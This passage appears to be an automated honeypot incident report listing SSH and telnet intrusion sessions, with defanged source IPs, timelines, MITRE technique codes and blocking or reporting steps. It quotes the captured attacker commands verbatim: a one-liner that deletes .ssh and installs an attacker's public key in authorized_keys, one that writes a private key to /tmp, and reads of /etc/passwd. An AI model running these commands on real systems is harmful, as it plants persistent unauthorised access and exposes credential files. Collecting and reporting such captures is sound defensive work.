| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:55:53` | `cowrie.session.connect` |
| `2026-09-27 13:55:53` | `cowrie.client.version` |
| `2026-09-27 13:55:54` | `cowrie.client.kex` |
| `2026-09-27 13:55:54` | `cowrie.login.success` |
| `2026-09-27 13:55:55` | `cowrie.session.params` |
| `2026-09-27 13:55:55` | `cowrie.command.input` |
| `2026-09-27 13:55:56` | `cowrie.session.file_download` |
| `2026-09-27 13:55:56` | `cowrie.session.file_download` |
| `2026-09-27 13:55:56` | `cowrie.log.closed` |
| `2026-09-27 13:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a9463dbcb26

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-27 14:14 |
| **Last Seen** | 2026-09-27 14:14 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:14:24` | `cowrie.session.connect` |
| `2026-09-27 14:14:24` | `cowrie.client.version` |
| `2026-09-27 14:14:24` | `cowrie.client.kex` |
| `2026-09-27 14:14:25` | `cowrie.login.success` |
| `2026-09-27 14:14:27` | `cowrie.direct-tcpip.request` |
| `2026-09-27 14:14:28` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 14:14:28` | `cowrie.direct-tcpip.data` |
| `2026-09-27 14:14:30` | `cowrie.direct-tcpip.request` |
| `2026-09-27 14:14:31` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 14:14:31` | `cowrie.direct-tcpip.data` |
| `2026-09-27 14:14:34` | `cowrie.direct-tcpip.request` |
| `2026-09-27 14:14:36` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 14:14:36` | `cowrie.direct-tcpip.data` |
| `2026-09-27 14:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a01e834868c6

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-27 14:14 |
| **Last Seen** | 2026-09-27 14:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:14:29` | `cowrie.session.connect` |
| `2026-09-27 14:14:29` | `cowrie.client.version` |
| `2026-09-27 14:14:29` | `cowrie.client.kex` |
| `2026-09-27 14:14:30` | `cowrie.login.success` |
| `2026-09-27 14:14:33` | `cowrie.direct-tcpip.request` |
| `2026-09-27 14:14:35` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 14:14:35` | `cowrie.direct-tcpip.data` |
| `2026-09-27 14:14:36` | `cowrie.direct-tcpip.request` |
| `2026-09-27 14:14:38` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 14:14:38` | `cowrie.direct-tcpip.data` |
| `2026-09-27 14:14:39` | `cowrie.direct-tcpip.request` |
| `2026-09-27 14:14:39` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 14:14:39` | `cowrie.direct-tcpip.data` |
| `2026-09-27 14:14:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17905efedf13

| Field | Detail |
|---|---|
| **Source IP** | `222.121.61[.]132` |
| **First Seen** | 2026-09-27 14:15 |
| **Last Seen** | 2026-09-27 14:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:15:57` | `cowrie.session.connect` |
| `2026-09-27 14:15:57` | `cowrie.client.version` |
| `2026-09-27 14:15:58` | `cowrie.client.kex` |
| `2026-09-27 14:15:59` | `cowrie.login.success` |
| `2026-09-27 14:16:00` | `cowrie.direct-tcpip.request` |
| `2026-09-27 14:16:00` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 14:16:00` | `cowrie.direct-tcpip.data` |
| `2026-09-27 14:16:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.121.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `222.121.61[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad751fab34c9

| Field | Detail |
|---|---|
| **Source IP** | `41.93.82[.]201` |
| **First Seen** | 2026-09-27 14:26 |
| **Last Seen** | 2026-09-27 14:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:26:34` | `cowrie.session.connect` |
| `2026-09-27 14:26:34` | `cowrie.client.version` |
| `2026-09-27 14:26:34` | `cowrie.client.kex` |
| `2026-09-27 14:26:35` | `cowrie.login.success` |
| `2026-09-27 14:26:36` | `cowrie.session.params` |
| `2026-09-27 14:26:36` | `cowrie.command.input` |
| `2026-09-27 14:26:36` | `cowrie.command.failed` |
| `2026-09-27 14:26:37` | `cowrie.log.closed` |
| `2026-09-27 14:26:38` | `cowrie.session.params` |
| `2026-09-27 14:26:38` | `cowrie.command.input` |
| `2026-09-27 14:26:38` | `cowrie.session.file_download` |
| `2026-09-27 14:26:38` | `cowrie.log.closed` |
| `2026-09-27 14:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.82[.]201` to AbuseIPDB if not already reported
- [ ] Block `41.93.82[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3436440e9be3

| Field | Detail |
|---|---|
| **Source IP** | `41.93.82[.]201` |
| **First Seen** | 2026-09-27 14:26 |
| **Last Seen** | 2026-09-27 14:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:26:38` | `cowrie.session.connect` |
| `2026-09-27 14:26:38` | `cowrie.client.version` |
| `2026-09-27 14:26:39` | `cowrie.client.kex` |
| `2026-09-27 14:26:40` | `cowrie.login.success` |
| `2026-09-27 14:26:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.82[.]201` to AbuseIPDB if not already reported
- [ ] Block `41.93.82[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ad7d3db9d37

| Field | Detail |
|---|---|
| **Source IP** | `41.93.82[.]201` |
| **First Seen** | 2026-09-27 14:26 |
| **Last Seen** | 2026-09-27 14:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:26:40` | `cowrie.session.connect` |
| `2026-09-27 14:26:40` | `cowrie.client.version` |
| `2026-09-27 14:26:41` | `cowrie.client.kex` |
| `2026-09-27 14:26:42` | `cowrie.login.success` |
| `2026-09-27 14:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.82[.]201` to AbuseIPDB if not already reported
- [ ] Block `41.93.82[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-949f3362a140

| Field | Detail |
|---|---|
| **Source IP** | `169.58.65[.]110` |
| **First Seen** | 2026-09-27 14:31 |
| **Last Seen** | 2026-09-27 14:34 |
| **Session Duration** | 180s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:31:37` | `cowrie.session.connect` |
| `2026-09-27 14:31:37` | `cowrie.telnet.option` |
| `2026-09-27 14:31:37` | `cowrie.telnet.option` |
| `2026-09-27 14:31:37` | `cowrie.login.success` |
| `2026-09-27 14:31:38` | `cowrie.session.params` |
| `2026-09-27 14:31:38` | `cowrie.telnet.option` |
| `2026-09-27 14:31:38` | `cowrie.telnet.option` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.failed` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.failed` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.failed` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.failed` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.failed` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.failed` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.failed` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.failed` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:31:38` | `cowrie.command.input` |
| `2026-09-27 14:34:38` | `cowrie.log.closed` |
| `2026-09-27 14:34:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.58.65[.]110` to AbuseIPDB if not already reported
- [ ] Block `169.58.65[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e27ba826a914

| Field | Detail |
|---|---|
| **Source IP** | `165.154.162[.]74` |
| **First Seen** | 2026-09-27 14:31 |
| **Last Seen** | 2026-09-27 14:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:31:41` | `cowrie.session.connect` |
| `2026-09-27 14:31:41` | `cowrie.client.version` |
| `2026-09-27 14:31:41` | `cowrie.client.kex` |
| `2026-09-27 14:31:42` | `cowrie.login.success` |
| `2026-09-27 14:31:42` | `cowrie.session.params` |
| `2026-09-27 14:31:42` | `cowrie.command.input` |
| `2026-09-27 14:31:42` | `cowrie.command.failed` |
| `2026-09-27 14:31:43` | `cowrie.log.closed` |
| `2026-09-27 14:31:43` | `cowrie.session.params` |
| `2026-09-27 14:31:43` | `cowrie.command.input` |
| `2026-09-27 14:31:43` | `cowrie.session.file_download` |
| `2026-09-27 14:31:43` | `cowrie.log.closed` |
| `2026-09-27 14:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.162[.]74` to AbuseIPDB if not already reported
- [ ] Block `165.154.162[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cff029cf639

| Field | Detail |
|---|---|
| **Source IP** | `165.154.162[.]74` |
| **First Seen** | 2026-09-27 14:31 |
| **Last Seen** | 2026-09-27 14:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:31:43` | `cowrie.session.connect` |
| `2026-09-27 14:31:43` | `cowrie.client.version` |
| `2026-09-27 14:31:44` | `cowrie.client.kex` |
| `2026-09-27 14:31:44` | `cowrie.login.success` |
| `2026-09-27 14:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.162[.]74` to AbuseIPDB if not already reported
- [ ] Block `165.154.162[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-567021029c77

| Field | Detail |
|---|---|
| **Source IP** | `165.154.162[.]74` |
| **First Seen** | 2026-09-27 14:31 |
| **Last Seen** | 2026-09-27 14:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:31:44` | `cowrie.session.connect` |
| `2026-09-27 14:31:44` | `cowrie.client.version` |
| `2026-09-27 14:31:44` | `cowrie.client.kex` |
| `2026-09-27 14:31:44` | `cowrie.login.success` |
| `2026-09-27 14:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.162[.]74` to AbuseIPDB if not already reported
- [ ] Block `165.154.162[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-501cece5fd8c

| Field | Detail |
|---|---|
| **Source IP** | `43.129.193[.]109` |
| **First Seen** | 2026-09-27 14:32 |
| **Last Seen** | 2026-09-27 14:32 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:32:19` | `cowrie.session.connect` |
| `2026-09-27 14:32:19` | `cowrie.client.version` |
| `2026-09-27 14:32:19` | `cowrie.client.kex` |
| `2026-09-27 14:32:22` | `cowrie.login.success` |
| `2026-09-27 14:32:31` | `cowrie.session.params` |
| `2026-09-27 14:32:31` | `cowrie.command.input` |
| `2026-09-27 14:32:31` | `cowrie.command.failed` |
| `2026-09-27 14:32:33` | `cowrie.log.closed` |
| `2026-09-27 14:32:34` | `cowrie.session.params` |
| `2026-09-27 14:32:34` | `cowrie.command.input` |
| `2026-09-27 14:32:34` | `cowrie.session.file_download` |
| `2026-09-27 14:32:34` | `cowrie.log.closed` |
| `2026-09-27 14:32:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.129.193[.]109` to AbuseIPDB if not already reported
- [ ] Block `43.129.193[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fdf376aefd3

| Field | Detail |
|---|---|
| **Source IP** | `43.129.193[.]109` |
| **First Seen** | 2026-09-27 14:32 |
| **Last Seen** | 2026-09-27 14:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:32:35` | `cowrie.session.connect` |
| `2026-09-27 14:32:35` | `cowrie.client.version` |
| `2026-09-27 14:32:35` | `cowrie.client.kex` |
| `2026-09-27 14:32:36` | `cowrie.login.success` |
| `2026-09-27 14:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.129.193[.]109` to AbuseIPDB if not already reported
- [ ] Block `43.129.193[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b08c71ae47be

| Field | Detail |
|---|---|
| **Source IP** | `43.129.193[.]109` |
| **First Seen** | 2026-09-27 14:32 |
| **Last Seen** | 2026-09-27 14:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:32:37` | `cowrie.session.connect` |
| `2026-09-27 14:32:37` | `cowrie.client.version` |
| `2026-09-27 14:32:37` | `cowrie.client.kex` |
| `2026-09-27 14:32:39` | `cowrie.login.success` |
| `2026-09-27 14:32:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.129.193[.]109` to AbuseIPDB if not already reported
- [ ] Block `43.129.193[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b99b12bee42d

| Field | Detail |
|---|---|
| **Source IP** | `37.252.69[.]10` |
| **First Seen** | 2026-09-27 14:35 |
| **Last Seen** | 2026-09-27 14:36 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, cat /proc/mounts; /bin/busybox DSLPJ` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:35:47` | `cowrie.session.connect` |
| `2026-09-27 14:35:48` | `cowrie.telnet.option` |
| `2026-09-27 14:35:48` | `cowrie.login.success` |
| `2026-09-27 14:35:48` | `cowrie.session.params` |
| `2026-09-27 14:35:49` | `cowrie.command.input` |
| `2026-09-27 14:35:49` | `cowrie.command.failed` |
| `2026-09-27 14:35:49` | `cowrie.command.input` |
| `2026-09-27 14:35:49` | `cowrie.command.failed` |
| `2026-09-27 14:35:49` | `cowrie.command.input` |
| `2026-09-27 14:35:49` | `cowrie.command.failed` |
| `2026-09-27 14:35:49` | `cowrie.command.input` |
| `2026-09-27 14:35:49` | `cowrie.command.input` |
| `2026-09-27 14:36:19` | `cowrie.log.closed` |
| `2026-09-27 14:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.252.69[.]10` to AbuseIPDB if not already reported
- [ ] Block `37.252.69[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aad78e1645c2

| Field | Detail |
|---|---|
| **Source IP** | `108.59.244[.]5` |
| **First Seen** | 2026-09-27 14:43 |
| **Last Seen** | 2026-09-27 14:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:43:09` | `cowrie.session.connect` |
| `2026-09-27 14:43:09` | `cowrie.login.success` |
| `2026-09-27 14:43:10` | `cowrie.session.params` |
| `2026-09-27 14:43:10` | `cowrie.command.input` |
| `2026-09-27 14:43:11` | `cowrie.command.input` |
| `2026-09-27 14:43:11` | `cowrie.command.input` |
| `2026-09-27 14:43:12` | `cowrie.command.input` |
| `2026-09-27 14:43:12` | `cowrie.command.failed` |
| `2026-09-27 14:43:12` | `cowrie.log.closed` |
| `2026-09-27 14:43:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.59.244[.]5` to AbuseIPDB if not already reported
- [ ] Block `108.59.244[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d03196a77e63

| Field | Detail |
|---|---|
| **Source IP** | `42.96.19[.]37` |
| **First Seen** | 2026-09-27 14:55 |
| **Last Seen** | 2026-09-27 14:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:55:01` | `cowrie.session.connect` |
| `2026-09-27 14:55:01` | `cowrie.client.version` |
| `2026-09-27 14:55:01` | `cowrie.client.kex` |
| `2026-09-27 14:55:02` | `cowrie.login.success` |
| `2026-09-27 14:55:04` | `cowrie.session.params` |
| `2026-09-27 14:55:04` | `cowrie.command.input` |
| `2026-09-27 14:55:04` | `cowrie.command.failed` |
| `2026-09-27 14:55:04` | `cowrie.log.closed` |
| `2026-09-27 14:55:06` | `cowrie.session.params` |
| `2026-09-27 14:55:06` | `cowrie.command.input` |
| `2026-09-27 14:55:06` | `cowrie.session.file_download` |
| `2026-09-27 14:55:06` | `cowrie.log.closed` |
| `2026-09-27 14:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.19[.]37` to AbuseIPDB if not already reported
- [ ] Block `42.96.19[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e58ee28fd103

| Field | Detail |
|---|---|
| **Source IP** | `42.96.19[.]37` |
| **First Seen** | 2026-09-27 14:55 |
| **Last Seen** | 2026-09-27 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:55:06` | `cowrie.session.connect` |
| `2026-09-27 14:55:07` | `cowrie.client.version` |
| `2026-09-27 14:55:07` | `cowrie.client.kex` |
| `2026-09-27 14:55:08` | `cowrie.login.success` |
| `2026-09-27 14:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.19[.]37` to AbuseIPDB if not already reported
- [ ] Block `42.96.19[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cd7c693a95e

| Field | Detail |
|---|---|
| **Source IP** | `42.96.19[.]37` |
| **First Seen** | 2026-09-27 14:55 |
| **Last Seen** | 2026-09-27 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 14:55:08` | `cowrie.session.connect` |
| `2026-09-27 14:55:08` | `cowrie.client.version` |
| `2026-09-27 14:55:09` | `cowrie.client.kex` |
| `2026-09-27 14:55:10` | `cowrie.login.success` |
